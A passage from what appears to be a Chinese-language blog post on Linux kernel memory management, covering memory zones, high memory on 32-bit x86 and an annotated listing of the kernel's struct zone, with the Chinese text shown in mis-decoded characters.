ä¸èƒ½è¢«å†…æ ¸ç›´æ¥æ˜ å°„.</p></blockquote><p>è¿™ä¹ˆå¤§è´¹å‘¨ç« åˆæ˜¯è¦å¹²å˜›ï¼Ÿå…¶å®è¿™ä¸‰ä¸ªåŒºéƒ½æœ‰è¯´æ³•ã€‚æœ€ä½16mbæ˜¯ä¸ºäº†å…¼å®¹isaæ€»çº¿dmaå¤„ç†å™¨ç”¨çš„ï¼ˆè™½ç„¶æˆ‘ä¸çŸ¥é“è¿™æ˜¯ä»€ä¹ˆï¼‰ï¼Œä¸­é—´èƒ½ç›´æ¥çº¿æ€§æ˜ å°„çš„å°±ç›´æ¥æ˜ å°„ï¼Œè€Œå¯¹äºç°ä»£32ä½x86æ¶æ„åªèƒ½å¯»å€4g,å¾ˆå¤šå†…å­˜æ²¡æ³•ç›´æ¥æ˜ å°„ï¼Œå°±åˆè¦å•ç‹¬è®¨è®ºï¼Œè¿™ä¹ˆç€åˆ’åˆ†çš„3ä¸ªåŒºã€‚</p><p>å…¶å®è¿˜æœ‰å…¶ä»–æ ‡è®°èŠ‚ç‚¹å†…å­˜åŒºçš„æ ‡è®°ï¼šæ¯”å¦‚ZONE_MOVEABLE, ZONE_DEVICEç­‰è¿™ç§ä¼ªå†…å­˜åŒºï¼Œä¸ºäº†çƒ­æ’æ‹”ç­‰ç­‰ç‰¹æ€§æ‰€è®¾è®¡ï¼Œè¿™é‡Œä¸å†å±•å¼€ã€‚è€Œç°åœ¨çš„AMD64æ¶æ„å·²ç»ä¸å†éœ€è¦é«˜ç«¯å†…å­˜äº†ï¼Œ128Tè¶³å¤Ÿå°†æ‰€æœ‰ç‰©ç†å†…å­˜çº¿æ€§æ˜ å°„åˆ°å†…æ ¸</p><blockquote><p>è¿™ä¹Ÿæˆä¸ºåé¢æˆ‘ä»¬è¦è°ˆçš„ret2diræ”»å‡»æ‰‹æ³•çš„å¼€å§‹</p></blockquote><p>æœ€åç®€å•è°ˆè°ˆ32ä½ä¸‹å†…æ ¸ç©ºé—´1gç”¨æˆ·ç©ºé—´3g,è¶…å‡ºnormalåŒºçš„é«˜ç«¯å†…å­˜å¦‚ä½•è®¿é—®ã€‚æŒ‰è¿™ç¯‡blogæ¥è®²ï¼Œå°±æ˜¯ä¸´æ—¶æ›¿æ¢é¡µè¡¨ï¼Œä»è™šæ‹Ÿåœ°å€é€‰ä¸€æ®µå‡ºæ¥åšé€»è¾‘åœ°å€ç©ºé—´ç„¶åä¸´æ—¶å€Ÿç”¨ï¼Œæ¢æ‰é¡µè¡¨å»ºç«‹æ˜ å°„ï¼Œç”¨å®Œå½’è¿˜ã€‚å¦å¤–ï¼Œintelä¼¼ä¹æ”¯æŒä¸€ç§å«åšPAEé¡µè¡¨æ‰©å±•çš„æŠ€æœ¯ï¼Œå¯ä»¥é€šè¿‡æ‰©å±•ä¸€çº§é¡µè¡¨è®©ç³»ç»Ÿè®¿é—®æ›´å¤šçš„å†…å­˜ï¼Œè¿™é‡Œä¹Ÿä¸å†å±•å¼€ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">zone</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="comment">/* Read-mostly fields */</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* zone watermarks, access with *_wmark_pages(zone) macros */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> watermark[NR_WMARK];</span><br><span class="line"></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> nr_reserved_highatomic;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * We don&#x27;t know if the memory that we&#x27;re going to allocate will be</span></span><br><span class="line"><span class="comment">     * freeable or/and it will be released eventually, so to avoid totally</span></span><br><span class="line"><span class="comment">     * wasting several GB of ram we must reserve some of the lower zone</span></span><br><span class="line"><span class="comment">     * memory (otherwise we risk to run OOM on the lower zones despite</span></span><br><span class="line"><span class="comment">     * there being tons of freeable ram on the higher zones).  This array is</span></span><br><span class="line"><span class="comment">     * recalculated at runtime if the sysctl_lowmem_reserve_ratio sysctl</span></span><br><span class="line"><span class="comment">     * changes.</span></span><br><span class="line"><span class="comment">     * åˆ†åˆ«ä¸ºå„ç§å†…å­˜åŸŸæŒ‡å®šäº†è‹¥å¹²é¡µ</span></span><br><span class="line"><span class="comment">     * ç”¨äºä¸€äº›æ— è®ºå¦‚ä½•éƒ½ä¸èƒ½å¤±è´¥çš„å…³é”®æ€§å†…å­˜åˆ†é…ã€‚</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="type">long</span> lowmem_reserve[MAX_NR_ZONES];</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_NUMA</span></span><br><span class="line">    <span class="type">int</span> node;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * The target ratio of ACTIVE_ANON to INACTIVE_ANON pages on</span></span><br><span class="line"><span class="comment">     * this zone&#x27;s LRU.  Maintained by the pageout code.</span></span><br><span class="line"><span class="comment">     * ä¸æ´»åŠ¨é¡µçš„æ¯”ä¾‹,</span></span><br><span class="line"><span class="comment">     * æ¥ç€æ˜¯ä¸€äº›å¾ˆå°‘ä½¿ç”¨æˆ–è€…å¤§éƒ¨åˆ†æƒ…å†µä¸‹æ˜¯åªè¯»çš„å­—æ®µï¼š</span></span><br><span class="line"><span class="comment">     * wait_table wait_table_hash_nr_entries wait_table_bits</span></span><br><span class="line"><span class="comment">     * å½¢æˆç­‰å¾…åˆ—é˜Ÿï¼Œå¯ä»¥ç­‰å¾…æŸä¸€é¡µå¯ä¾›è¿›ç¨‹ä½¿ç”¨  */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> inactive_ratio;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*  æŒ‡å‘è¿™ä¸ªzoneæ‰€åœ¨çš„pglist_dataå¯¹è±¡  */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">pglist_data</span>      *<span class="title">zone_pgdat</span>;</span></span><br><span class="line">    <span class="comment">/*/è¿™ä¸ªæ•°ç»„ç”¨äºå®ç°æ¯ä¸ªCPUçš„çƒ­/å†·é¡µå¸§åˆ—è¡¨ã€‚å†…æ ¸ä½¿ç”¨è¿™äº›åˆ—è¡¨æ¥ä¿å­˜å¯ç”¨äºæ»¡è¶³å®ç°çš„â€œæ–°é²œâ€é¡µã€‚ä½†å†·çƒ­é¡µå¸§å¯¹åº”çš„é«˜é€Ÿç¼“å­˜çŠ¶æ€ä¸åŒï¼šæœ‰äº›é¡µå¸§å¾ˆå¯èƒ½åœ¨é«˜é€Ÿç¼“å­˜ä¸­ï¼Œå› æ­¤å¯ä»¥å¿«é€Ÿè®¿é—®ï¼Œæ•…ç§°ä¹‹ä¸ºçƒ­çš„ï¼›æœªç¼“å­˜çš„é¡µå¸§ä¸æ­¤ç›¸å¯¹ï¼Œç§°ä¹‹ä¸ºå†·çš„ã€‚*/</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">per_cpu_pageset</span> __<span class="title">percpu</span> *<span class="title">pageset</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * This is a per-zone reserve of pages that are not available</span></span><br><span class="line"><span class="comment">     * to userspace allocations.</span></span><br><span class="line"><span class="comment">     * æ¯ä¸ªåŒºåŸŸä¿ç•™çš„ä¸èƒ½è¢«ç”¨æˆ·ç©ºé—´åˆ†é…çš„é¡µé¢æ•°ç›®</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span>       totalreserve_pages;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> CONFIG_SPARSEMEM</span></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * Flags for a pageblock_nr_pages block. See pageblock-flags.h.</span></span><br><span class="line"><span class="comment">     * In SPARSEMEM, this map is stored in struct mem_section</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span>       *pageblock_flags;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span> <span class="comment">/* CONFIG_SPARSEMEM */</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_NUMA</span></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * zone reclaim becomes active if more unmapped pages exist.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span>       min_unmapped_pages;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span>       min_slab_pages;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span> <span class="comment">/* CONFIG_NUMA */</span></span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* zone_start_pfn == zone_start_paddr &gt;&gt; PAGE_SHIFT</span></span><br><span class="line"><span class="comment">     * åªå†…å­˜åŸŸçš„ç¬¬ä¸€ä¸ªé¡µå¸§ */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span>       zone_start_pfn;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * spanned_pages is the total pages spanned by the zone, including</span></span><br><span class="line"><span class="comment">     * holes, which is calculated as:</span></span><br><span class="line"><span class="comment">     *      spanned_pages = zone_end_pfn - zone_start_pfn;</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * present_pages is physical pages existing within the zone, which</span></span><br><span class="line"><span class="comment">     * is calculated as:</span></span><br><span class="line"><span class="comment">     *      present_pages = spanned_pages - absent_pages(pages in holes);</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * managed_pages is present pages managed by the buddy system, which</span></span><br><span class="line"><span class="comment">     * is calculated as (reserved_pages includes pages allocated by the</span></span><br><span class="line"><span class="comment">     * bootmem allocator):</span></span><br><span class="line"><span class="comment">     *      managed_pages = present_pages - reserved_pages;</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * So present_pages may be used by memory hotplug or memory power</span></span><br><span class="line"><span class="comment">     * management logic to figure out unmanaged pages by checking</span></span><br><span class="line"><span class="comment">     * (present_pages - managed_pages). And managed_pages should be used</span></span><br><span class="line"><span class="comment">     * by page allocator and vm scanner to calculate all kinds of watermarks</span></span><br><span class="line"><span class="comment">     * and thresholds.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * Locking rules:</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * zone_start_pfn and spanned_pages are protected by span_seqlock.</span></span><br><span class="line"><span class="comment">     * It is a seqlock because it has to be read outside of zone-&gt;lock,</span></span><br><span class="line"><span class="comment">     * and it is done in the main allocator path.  But, it is written</span></span><br><span class="line"><span class="comment">     * quite infrequently.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * The span_seq lock is declared along with zone-&gt;lock because it is</span></span><br><span class="line"><span class="comment">     * frequently read in proximity to zone-&gt;lock.  It&#x27;s good to</span></span><br><span class="line"><span class="comment">     * give them a chance of being in the same cacheline.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * Write access to present_pages at runtime should be protected by</span></span><br><span class="line"><span class="comment">     * mem_hotplug_begin/end(). Any reader who can&#x27;t tolerant drift of</span></span><br><span class="line"><span class="comment">     * present_pages should get_online_mems() to get a stable value.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * Read access to managed_pages should be safe because it&#x27;s unsigned</span></span><br><span class="line"><span class="comment">     * long. Write access to zone-&gt;managed_pages and totalram_pages are</span></span><br><span class="line"><span class="comment">     * protected by managed_page_count_lock at runtime. Idealy only</span></span><br><span class="line"><span class="comment">     * adjust_managed_page_count() should be used instead of directly</span></span><br><span class="line"><span class="comment">     * touching zone-&gt;managed_pages and totalram_pages.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span>       managed_pages;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span>       spanned_pages;             <span class="comment">/*  æ€»é¡µæ•°ï¼ŒåŒ…å«ç©ºæ´  */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span>       present_pages;              <span class="comment">/*  å¯ç”¨é¡µæ•°ï¼Œä¸åŒ…å“ˆç©ºæ´  */</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/*  æŒ‡å‘ç®¡ç†åŒºçš„ä¼ ç»Ÿåå­—, &quot;DMA&quot;, &quot;NROMAL&quot;æˆ–&quot;HIGHMEM&quot; */</span></span><br><span class="line">    <span class="type">const</span> <span class="type">char</span>          *name;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_MEMORY_ISOLATION</span></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * Number of isolated pageblock. It is used to solve incorrect</span></span><br><span class="line"><span class="comment">     * freepage counting problem due to racy retrieving migratetype</span></span><br><span class="line"><span class="comment">     * of pageblock. Protected by zone-&gt;lock.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span>       nr_isolate_pageblock;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_MEMORY_HOTPLUG</span></span><br><span class="line">    <span class="comment">/* see spanned/present_pages for more description */</span></span><br><span class="line">    <span class="type">seqlock_t</span>           span_seqlock;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * wait_table       -- the array holding the hash table</span></span><br><span class="line"><span class="comment">     * wait_table_hash_nr_entries   -- the size of the hash table array</span></span><br><span class="line"><span class="comment">     * wait_table_bits      -- wait_table_size == (1 &lt;&lt; wait_table_bits)</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * The purpose of all these is to keep track of the people</span></span><br><span class="line"><span class="comment">     * waiting for a page to become available and make them</span></span><br><span class="line"><span class="comment">     * runnable again when possible. The trouble is that this</span></span><br><span class="line"><span class="comment">     * consumes a lot of space, especially when so few things</span></span><br><span class="line"><span class="comment">     * wait on pages at a given time. So instead of using</span></span><br><span class="line"><span class="comment">     * per-page waitqueues, we use a waitqueue hash table.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * The bucket discipline is to sleep on the same queue when</span></span><br><span class="line"><span class="comment">     * colliding and wake all in that wait queue when removing.</span></span><br><span class="line"><span class="comment">     * When something wakes, it must check to be sure its page is</span></span><br><span class="line"><span class="comment">     * truly available, a la thundering herd. The cost of a</span></span><br><span class="line"><span class="comment">     * collision is great, but given the expected load of the</span></span><br><span class="line"><span class="comment">     * table, they should be so rare as to be outweighed by the</span></span><br><span class="line"><span class="comment">     * benefits from the saved space.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * __wait_on_page_locked() and unlock_page() in mm/filemap.c, are the</span></span><br><span class="line"><span class="comment">     * primary users of these fields, and in mm/page_alloc.c</span></span><br><span class="line"><span class="comment">     * free_area_init_core() performs the initialization of them.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="comment">/*  è¿›ç¨‹ç­‰å¾…é˜Ÿåˆ—çš„æ•£åˆ—è¡¨, è¿™äº›è¿›ç¨‹æ­£åœ¨ç­‰å¾…ç®¡ç†åŒºä¸­çš„æŸé¡µ  */</span></span><br><span class="line">    <span class="type">wait_queue_head_t</span>       *wait_table;</span><br><span class="line">    <span class="comment">/*  ç­‰å¾…é˜Ÿåˆ—æ•£åˆ—è¡¨ä¸­çš„è°ƒåº¦å®ä½“æ•°ç›®  */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span>       wait_table_hash_nr_entries;</span><br><span class="line">    <span class="comment">/*  ç­‰å¾…é˜Ÿåˆ—æ•£åˆ—è¡¨æ•°ç»„å¤§å°, å€¼ä¸º2^order  */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span>       wait_table_bits;</span><br><span class="line"></span><br><span class="line">    ZONE_PADDING(_pad1_)</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* free areas of different sizes</span></span><br><span class="line"><span class="comment">       é¡µé¢ä½¿ç”¨çŠ¶æ€çš„ä¿¡æ¯ï¼Œä»¥æ¯ä¸ªbitæ ‡è¯†å¯¹åº”çš„pageæ˜¯å¦å¯ä»¥åˆ†é…</span></span><br><span class="line"><span class="comment">       æ˜¯ç”¨äºä¼™ä¼´ç³»ç»Ÿçš„ï¼Œæ¯ä¸ªæ•°ç»„å…ƒç´ æŒ‡å‘å¯¹åº”é˜¶ä¹Ÿè¡¨çš„æ•°ç»„å¼€å¤´</span></span><br><span class="line"><span class="comment">       ä»¥ä¸‹æ˜¯ä¾›é¡µå¸§å›æ”¶æ‰«æå™¨(page reclaim scanner)è®¿é—®çš„å­—æ®µ</span></span><br><span class="line"><span class="comment">       scannerä¼šè·Ÿæ®é¡µå¸§çš„æ´»åŠ¨æƒ…å†µå¯¹å†…å­˜åŸŸä¸­ä½¿ç”¨çš„é¡µè¿›è¡Œç¼–ç›®</span></span><br><span class="line"><span class="comment">       å¦‚æœé¡µå¸§è¢«é¢‘ç¹è®¿é—®ï¼Œåˆ™æ˜¯æ´»åŠ¨çš„ï¼Œç›¸ååˆ™æ˜¯ä¸æ´»åŠ¨çš„ï¼Œ</span></span><br><span class="line"><span class="comment">       åœ¨éœ€è¦æ¢å‡ºé¡µå¸§æ—¶ï¼Œè¿™æ ·çš„ä¿¡æ¯æ˜¯å¾ˆé‡è¦çš„ï¼š   */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">free_area</span>    <span class="title">free_area</span>[<span class="title">MAX_ORDER</span>];</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* zone flags, see below æè¿°å½“å‰å†…å­˜çš„çŠ¶æ€, å‚è§ä¸‹é¢çš„enum zone_flagsç»“æ„ */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span>       flags;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Write-intensive fields used from the page allocator, ä¿å­˜è¯¥æè¿°ç¬¦çš„è‡ªæ—‹é”  */</span></span><br><span class="line">    <span class="type">spinlock_t</span>          lock;</span><br><span class="line"></span><br><span class="line">    ZONE_PADDING(_pad2_)</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Write-intensive fields used by page reclaim */</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Fields commonly accessed by the page reclaim scanner */</span></span><br><span class="line">    <span class="type">spinlock_t</span>          lru_lock;   <span class="comment">/* LRU(æœ€è¿‘æœ€å°‘ä½¿ç”¨ç®—æ³•)æ´»åŠ¨ä»¥åŠéæ´»åŠ¨é“¾è¡¨ä½¿ç”¨çš„è‡ªæ—‹é”  */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">lruvec</span>       <span class="title">lruvec</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * When free pages are below this point, additional steps are taken</span></span><br><span class="line"><span class="comment">     * when reading the number of free pages to avoid per-cpu counter</span></span><br><span class="line"><span class="comment">     * drift allowing watermarks to be breached</span></span><br><span class="line"><span class="comment">     * åœ¨ç©ºé—²é¡µçš„æ•°ç›®å°‘äºè¿™ä¸ªç‚¹percpu_drift_markçš„æ—¶å€™</span></span><br><span class="line"><span class="comment">     * å½“è¯»å–å’Œç©ºé—²é¡µæ•°ä¸€æ ·çš„å†…å­˜é¡µæ—¶ï¼Œç³»ç»Ÿä¼šé‡‡å–é¢å¤–çš„å·¥ä½œï¼Œ</span></span><br><span class="line"><span class="comment">     * é˜²æ­¢å•CPUé¡µæ•°æ¼‚ç§»ï¼Œä»è€Œå¯¼è‡´æ°´å°è¢«ç ´åã€‚</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> percpu_drift_mark;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> defined CONFIG_COMPACTION || defined CONFIG_CMA</span></span><br><span class="line">    <span class="comment">/* pfn where compaction free scanner should start */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span>       compact_cached_free_pfn;</span><br><span class="line">    <span class="comment">/* pfn where async and sync compaction migration scanner should start */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span>       compact_cached_migrate_pfn[<span class="number">2</span>];</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_COMPACTION</span></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * On compaction failure, 1&lt;&lt;compact_defer_shift compactions</span></span><br><span class="line"><span class="comment">     * are skipped before trying again. The number attempted since</span></span><br><span class="line"><span class="comment">     * last failure is tracked with compact_considered.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span>        compact_considered;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span>        compact_defer_shift;</span><br><span class="line">    <span class="type">int</span>                       compact_order_failed;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> defined CONFIG_COMPACTION || defined CONFIG_CMA</span></span><br><span class="line">    <span class="comment">/* Set to true when the PG_migrate_skip bits should be cleared */</span></span><br><span class="line">    <span class="type">bool</span>            compact_blockskip_flush;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">    <span class="type">bool</span>            contiguous;</span><br><span class="line"></span><br><span class="line">    ZONE_PADDING(_pad3_)</span><br><span class="line">    <span class="comment">/* Zone statistics å†…å­˜åŸŸçš„ç»Ÿè®¡ä¿¡æ¯, å‚è§åé¢çš„enum zone_stat_itemç»“æ„ */</span></span><br><span class="line">    <span class="type">atomic_long_t</span>       vm_stat[NR_VM_ZONE_STAT_ITEMS];</span><br><span class="line">&#125; ____cacheline_internodealigned_in_smp;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>å‰©ä¸‹çš„å†…å®¹å¤ªå¤æ‚äº†ï¼Œä¸å†èµ˜è¿°ã€‚æ€»ç»“å‚çœ‹ä¸‹æ–¹é“¾æ¥å³å¯ã€‚æ€»çš„æ¥è®²ï¼Œâ€œåŒºâ€åªæ˜¯ä¸€ç§é€»è¾‘ä¸Šçš„åˆ†ç»„ï¼Œæ–¹ä¾¿æ“ä½œç³»ç»ŸæŒ‰ä¸€å®šçš„ç»“æ„å’Œé¡ºåºå»ç®¡ç†é¡µçš„åˆ†é…ã€‚å¹¶ä¸æ˜¯ä¸€ç§ç‰©ç†ä¸Šçš„å¼ºåˆ¶æªæ–½ã€‚</p><blockquote><p>å‚è€ƒ<a href="https://www.cnblogs.com/linhaostudy/p/10006723.html#autoid-6-4-0">https://www.cnblogs.com/linhaostudy/p/10006723.html#autoid-6-4-0</a></p></blockquote><h2 id="ä»€ä¹ˆæ˜¯é¡µæ¡†ï¼Ÿ">ä»€ä¹ˆæ˜¯é¡µæ¡†ï¼Ÿ</h2><blockquote><p><a href="https://blog.csdn.net/gatieme/article/details/52384636">https://blog.csdn.net/gatieme/article/details/52384636</a><br>è¿™åº”è¯¥æ˜¯ä¸€ä¸ªå¤§ä½¬ä¸€ç³»åˆ—çš„æ–‡ç« </p></blockquote><p>ç»ˆäºåˆ°äº†æˆ‘ä»¬ç†Ÿæ‚‰çš„å†…å®¹ï¼ŒåŒºä¸‹é¢ç®¡ç†çš„å°±æ˜¯ä¸€ä¸ªä¸ªé¡µæ¡†äº†ã€‚linuxä¹Ÿç”¨ä¸€ä¸ªç»“æ„ä½“ç®¡ç†ç‰©ç†page frameå«åš<code>struct page</code>ã€‚è€ƒè™‘åˆ°å¤§é‡çš„pageæ•°é‡ï¼Œpageç»“æ„è¦å°½é‡çš„å°ï¼Œå› æ­¤è¿™ä¸ªç»“æ„é‡Œä½¿ç”¨äº†å¤§é‡çš„è”åˆä½“ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span 